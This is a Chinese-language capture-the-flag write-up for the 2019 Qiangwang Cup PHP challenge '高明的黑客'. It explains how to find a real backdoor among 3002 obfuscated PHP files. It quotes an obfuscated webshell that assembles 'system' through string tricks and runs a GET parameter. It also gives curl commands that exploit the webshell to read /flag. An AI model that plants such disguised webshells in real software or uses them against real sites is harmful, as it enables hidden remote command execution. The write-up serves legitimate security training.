# [强网杯 2019]高明的黑客

## 题目概述
题目提示网站已被黑，并泄露了网站源码备份 `www.tar.gz`。解压后发现包含 3002 个 PHP 文件，需要从中找到可利用的后门。

## 信息收集
1. 访问首页显示"网站已被黑"，提示有 `www.tar.gz` 备份
2. 下载 `www.tar.gz` 并解压，得到 `src/` 目录包含 3002 个 PHP 文件
3. 每个 PHP 文件都包含大量混淆代码，包含各种危险函数调用（system、exec、assert、eval 等）

## 漏洞分析
题目核心难点：
1. **大量混淆代码**：每个文件都有数百行无意义代码，干扰审计
2. **假后门**：大量看似可利用但实际不可达的代码（被注释、条件永远为假、变量被覆盖等）
3. **动态构造函数名**：使用字符串拼接和分割来隐藏真实调用的函数

关键发现 - `xk0SzyKwfzw.php` 中的有效后门：
```php
$XnEGfa = $_GET['Efa5BVG'] ?? ' ';
$aYunX = "sY";
$aYunX .= "stEmXnsTcx";
$aYunX = explode('Xn', $aYunX);
$kDxfM = new stdClass();
$kDxfM->gHht = $aYunX[0];
($kDxfM->gHht)($XnEGfa);
```

分析：
- `"sY" + "stEmXnsTcx"` = `"sYstEmXnsTcx"`
- `explode('Xn', ...)` 分割得到 `["sYstEm", "sTcx"]`
- 取 `$aYunX[0]` = `"sYstEm"`
- PHP 函数名**不区分大小写**，所以 `sYstEm` 等同于 `system`
- 最终调用 `system($_GET['Efa5BVG'])`

## 利用过程
直接请求后门文件并传入命令：

```bash
curl "http://TARGET/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag"
```

响应中包含 flag：`flag{1c2b47f5-3de0-4e36-8059-04b6b95ae93e}`

## 复现步骤
```bash
# 1. 下载源码
curl -O http://TARGET/www.tar.gz
tar -xzf www.tar.gz

# 2. 搜索包含目标参数的文件
grep -l "Efa5BVG" src/*.php

# 3. 利用后门
curl "http://TARGET/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag"
```

## 关键技术点
1. **动态测试优于静态审计**：3002 个文件静态审计效率极低，应编写脚本动态测试
2. **PHP 大小写不敏感**：`sYstEm` = `system`，混淆时常用此特性
3. **变量函数调用**：PHP 支持用变量存储函数名并调用 `($var)()`
